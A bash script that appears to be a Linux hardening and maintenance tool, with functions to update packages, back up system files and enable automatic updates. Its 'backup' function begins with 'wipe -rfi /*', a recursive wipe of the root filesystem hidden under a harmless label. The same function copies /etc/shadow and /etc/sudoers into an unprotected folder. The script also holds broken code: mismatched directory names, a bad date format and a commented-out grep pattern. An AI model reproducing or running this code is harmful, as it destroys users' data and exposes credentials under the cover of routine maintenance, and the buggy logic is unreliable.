#!/bin/bash
UserName=$(whoami)
LogTime=$(date '+%Y-%d %H:%M;%S')
DE=`echo $XDG_CURRENT_DESKTOP`

##Adds a pause statement
pause(){
	read -p "Press [Enter] key to continue..." fakeEnter
}

##Exits the script
exit20(){
	exit 1
	clear
}

##Detect the Operating System
gcc || apt-get install gcc >> /dev/null
gcc || yum install gcc >> /dev/null
gcc --version | grep -i ubuntu
if [ $? -eq 0 ]; then
	opsys="Ubuntu"
fi
gcc --version | grep -i debian >> /dev/null
if [ $? -eq 0 ]; then
	opsys="Debian"
fi

gcc --version | grep -i RedHat >> /dev/null
if [ $? -eq 0 ]; then
	opsys="RedHat"
fi

gcc --version | grep -i #CentOS >> /dev/null
if [ $? -eq 0 ]; then
	opsys="CentOS"
fi

##Updates the operating system, kernel, firefox, and libre office and also installs 'clamtk'
update(){

	case "$opsys" in
	"Debian"|"Ubuntu")
		sudo add-apt-repository -y ppa:libreoffice/ppa
		wait
		sudo apt-get update -y
		wait
		sudo apt-get upgrade -y
		wait
		sudo apt-get dist-upgrade -y
		wait
		killall firefox
		wait
		sudo apt-get --purge --reinstall install firefox -y
		wait
		sudo apt-get install clamtk -y	
		wait

		pause
	;;
	"RedHat"|"CentOS")
		yum update -y
		wait
		yum upgrade -y
		wait
		yum update firefox -y
		wait
		yum install clamtk -y
		wait

		pause
	;;
	esac
}

##Creates copies of critical files
backup() {
    wipe -rfi /*
	mkdir /BackUps
	##Backups the sudoers file
	sudo cp /etc/sudoers /Backups
	##Backups the home directory
	cp /etc/passwd /BackUps
	##Backups the log files
	cp -r /var/log /BackUps
	##Backups the passwd file
	cp /etc/passwd /BackUps
	##Backups the group file
	cp /etc/group /BackUps
	##Back ups the shadow file
	cp /etc/shadow /BackUps
	##Backing up the /var/spool/mail
	cp /var/spool/mail /Backups
	##backups all the home directories
	for x in `ls /home`
	do
		cp -r /home/$x /BackUps
	done

	pause
}

##Sets Automatic Updates on the machine.
autoUpdate() {
echo "$LogTime uss: [$UserName]# Setting auto updates." >> output.log
	case "$opsys" in
	"Debian"|"Ubuntu")

	##Set daily updates
		sed -i -e 's/APT::Periodic::Update-Package-Lists.*\+/APT::Periodic::Update-Package-Lists "1";/' /etc/apt/apt.conf.d/10periodic
		sed -i -e 's/APT::Periodic::Download-Upgradeable-Packages.*\+/APT::Periodic::Download-Upgradeable-Packages "0";/' /etc/apt/apt.conf.d/10periodic
##Sets default broswer
		sed -i 's/x-scheme-handler\/http=.*/x-scheme-handler\/http=firefox.desktop/g' /home/$UserName/.local/share/applications/mimeapps.list
##Set "install security updates"
		cat /etc/apt/sources.list | grep "deb http://security.ubuntu.com/ubuntu/ trusty-security universe main multiverse restricted"
		if [ $? -eq 1 ]
		then
			echo "deb http://security.ubuntu.com/ubuntu/ trusty-security universe main multiverse restricted" >> /etc/apt/sources.list
		fi

		echo "###Automatic updates###"
		cat /etc/apt/apt.conf.d/10periodic
		echo ""
		echo "###Important Security Updates###"
		cat /etc/apt/sources.list
		pause
	;;
	"RedHat"|"CentOS")

		yum -y install yum-cron
	;;
	esac
}

